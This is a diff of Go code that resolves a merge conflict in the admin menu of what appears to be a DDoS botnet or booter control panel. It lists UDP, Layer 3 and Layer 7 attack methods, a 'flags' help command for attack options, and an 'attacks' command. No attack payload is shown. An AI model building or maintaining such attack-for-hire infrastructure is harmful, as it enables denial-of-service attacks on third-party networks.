@@ -478,11 +478,7 @@ func Admin(conn net.Conn) {
 				{"methods_udp", ansiCommands + "View all UDP methods available" + ansiReset},
 				{"methods_l3", ansiCommands + "View all Layer 3 methods available" + ansiReset},
 				{"methods_l7", ansiCommands + "View all Layer 7 methods available" + ansiReset},
-<<<<<<< HEAD
 				{"flags <.method>", ansiCommands + "View attack flags for a specific method" + ansiReset},
-=======
-				{"flags", ansiCommands + "Method Flags Usage" + ansiReset},
->>>>>>> f080eddd2b810bc0f5b1bce26afd45e2c29477cb
 				{"clear", ansiCommands + "Clears your terminal and history" + ansiReset},
 			}
 			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
@@ -561,7 +557,6 @@ func Admin(conn net.Conn) {
 			writeGradientTable(session.Conn, []string{"Layer 7 Methods", "Description"}, rows)
 
 		case "flags":
-<<<<<<< HEAD
 			args := strings.Fields(command)[1:]
 			if len(args) == 0 {
 				session.Conn.Write([]byte(ansiSystem + "Usage: flags <method>\r\n" + ansiReset))
@@ -608,8 +603,6 @@ func Admin(conn net.Conn) {
 
 			headers := []string{"Flag", "Description"}
 			writeGradientTable(session.Conn, headers, rows)
-=======
->>>>>>> f080eddd2b810bc0f5b1bce26afd45e2c29477cb
 
 		case "attacks":
 			args := strings.Split(strings.ToLower(command), " ")[1:]
